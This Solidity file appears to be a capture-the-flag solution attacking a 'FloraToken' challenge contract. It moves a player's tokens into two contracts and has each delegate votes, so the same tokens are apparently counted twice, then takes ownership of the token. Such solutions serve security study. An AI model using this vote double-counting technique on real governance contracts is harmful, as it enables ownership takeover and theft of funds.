// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
// Imports
import './Setup.sol';

contract Exploit2 {
    function attack() public {
        Exploit(payable(msg.sender)).challenge().delegate(msg.sender);
    }
}

contract Exploit {
    FloraToken public challenge;
    Exploit2 public helper;
    constructor (Setup setup) {
        // setup
        challenge = setup.instance();
        helper = new Exploit2();
        // organize our tokens :(
        // address sender = tx.origin;     // testing
        address sender = 0x9678408E1B126A985D61a0A6c99ae98AbF4c85B3;    // live
        uint amount = challenge.balanceOf(sender);
        setup.approveFor(sender, address(this), amount);
        challenge.transferFrom(sender, address(this), amount);
        // split tokens
        challenge.transfer(address(helper), amount / 2);
    }

    function exploit2() public {
        helper.attack();
        challenge.transferOwnership(address(this));
    }

    function exploit() public {
        challenge.delegate(address(this));
    }

    fallback() external payable {}
    
}
